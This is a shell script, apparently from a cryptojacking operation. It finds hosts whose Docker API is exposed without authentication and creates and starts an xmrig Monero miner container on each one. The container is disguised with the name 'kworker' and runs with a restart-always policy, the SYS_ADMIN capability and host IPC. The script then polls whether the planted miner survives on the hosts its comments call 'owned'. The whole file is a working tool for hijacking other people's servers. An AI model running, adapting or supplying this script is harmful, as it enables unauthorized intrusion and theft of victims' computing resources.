#!/bin/sh
# ============================================================================
# persistence probe.
#
# The yield audit says most hosts we call "owned" do not hold a container of
# ours at all. Two very different worlds produce that:
#   (a) the host prunes us between runs, so the 20-min gap is mostly downtime, or
#   (b) our create never persists on that class at all.
# This distinguishes them: create+start once, then watch at +30/+120/+300s
# whether the container is still listed and still running.
#
# usage: sh _persist.sh ip [ip ...]      (hosts probed in parallel, ~5 min)
# ============================================================================
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
POOL="${POOL:-pool.supportxmr.com:443}"
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\",\"--tls\",\"--cpu-max-threads-hint=100\",\"--huge-pages-jit\",\"--cpu-no-yield\""
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{\"kworker\":\"1\"},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"

ep() {
    b=""; o=""; pv=""
    for p in 2375 2376 4243; do
        case $p in
            2376) hb="https://$1:$p"; ho="-k" ;;
            *)    hb="http://$1:$p";  ho=""  ;;
        esac
        v=$(curl -fsS $ho --max-time 4 "$hb/version" 2>/dev/null) || continue
        case "$v" in
            *ApiVersion*)
                pv=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
                b="$hb"; o="$ho"; return 0 ;;
        esac
    done
    return 1
}

# present? -> "present id=<short> state=<state>" | "absent" | "listfail"
present() {
    l=$(curl -fsS $o --max-time 6 "$bb/containers/json?all=1" 2>/dev/null) || l=""
    [ -n "$l" ] || { printf 'listfail\n'; return 0; }
    f=$(printf '%s' "$l" | sed 's/},{/}\n{/g' | grep -i 'kworker' | head -1)
    [ -n "$f" ] || { printf 'absent\n'; return 0; }
    fi_id=$(printf '%s' "$f" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4 | cut -c1-8)
    fi_st=$(printf '%s' "$f" | grep -o '"State":"[a-z]*"' | head -1 | cut -d'"' -f4)
    printf 'present id=%s state=%s\n' "${fi_id:-?}" "${fi_st:-?}"
}

probe() {
    ip=$1
    out="/tmp/_persist.$ip.out"
    : > "$out"
    if ! ep "$ip"; then echo "$ip  no-daemon" >> "$out"; return 0; fi
    bb="$b"; [ -n "$pv" ] && bb="$b/v$pv"
    echo "$ip  base=$b api=$pv  before: $(present)" >> "$out"
    cr=$(curl -sS $o --max-time 30 -w '|%{http_code}' -X POST \
              "$bb/containers/create?name=kworkerp" \
              -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null) || cr="|000"
    id=$(printf '%s' "${cr%|*}" | grep -oE '[0-9a-f]{64}' | head -1)
    echo "$ip  create=${cr##*|} id=${id:-none} $(printf '%s' "${cr%|*}" | head -c 70)" >> "$out"
    [ -n "$id" ] || return 0
    st=$(curl -sS $o --max-time 25 -w '|%{http_code}' -X POST \
              "$bb/containers/$id/start" 2>/dev/null) || st="|000"
    echo "$ip  start=${st##*|} $(printf '%s' "${st%|*}" | head -c 70)" >> "$out"
    sleep 30;  echo "$ip  +30s   $(present)" >> "$out"
    sleep 90;  echo "$ip  +120s  $(present)" >> "$out"
    sleep 180; echo "$ip  +300s  $(present)" >> "$out"
    # what does the daemon say about it, if it is still there?
    d=$(curl -sS $o --max-time 8 "$bb/containers/$id/json" 2>/dev/null) || d=""
    if [ -n "$d" ]; then
        echo "$ip  detail: $(printf '%s' "$d" | grep -o '"Status":"[^"]*"' | head -1) $(printf '%s' "$d" | grep -o '"ExitCode":[0-9]*' | head -1) $(printf '%s' "$d" | grep -o '"Error":"[^"]*"' | head -1)" >> "$out"
    else
        echo "$ip  detail: id route 404s (canned front)" >> "$out"
    fi
}

for ip in "$@"; do
    probe "$ip" &
done
wait
echo "=== persist summary ==="
cat /tmp/_persist.*.out 2>/dev/null | sort
